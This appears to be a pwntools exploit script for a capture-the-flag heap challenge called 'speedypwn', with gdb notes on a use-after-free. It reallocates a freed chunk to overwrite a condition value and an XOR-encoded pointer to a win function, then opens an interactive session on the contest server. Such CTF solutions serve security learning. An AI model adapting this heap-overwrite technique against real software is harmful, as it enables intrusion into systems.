from pwn import *

#use create data "aaaaaaaa"
#In IDA find the jmp, break at 0x4009b8
# Refer to .gdb_history_speedy:
#Breakpoint 2, 0x00000000004009b8 in useee ()
#heapinfo
#gdb-peda$ find 0x5178aabc#
#earching for '0x5178aabc' in: None ranges
#Found 3 results, display max 3 items:
#speedypwn_c743765c8f6d2fcfc0eabde9315f4a9b : 0x40093d (<useee+51>:	mov    esp,0x485178aa)
#speedypwn_c743765c8f6d2fcfc0eabde9315f4a9b : 0x4009b4 (<useee+170>:	mov    esp,0x755178aa)
 #                                   [heap] : 0x603010 --> 0x5178aabc 
#x/32gx 0x603010
#We have found the value to satisify the if condition, pointer and data
#Once free (2), the if data is freed
#If realloc in 16 occupy two blocks, it will overwrite the if case and pointer
#Set the if condition value: 0x41DEBF43
#Set 0x400837  (Win function) ^ 0x213141516171 as decrypt ptr


#r=process("/home/vxrl/Desktop/speedypwn_c743765c8f6d2fcfc0eabde9315f4a9b")

r=remote("speedhack-pwn-13935cd1502a01e8890ec92ac920528c.theori.io",8171)

sleep(1)
r.sendline("1")
sleep(1)
r.sendline("aaaaaaaa")
sleep(1)
r.sendline("2")
sleep(1)
r.sendline("3")
sleep(1)
r.sendline("16") #send alloc size
sleep(1)
r.sendline(p64(0x41DEBF43)+p64(0x400837^0x213141516171)) #if-condition + decrypt ptr(win's address XOR the value)
sleep(1)
r.sendline("1")
r.interactive()

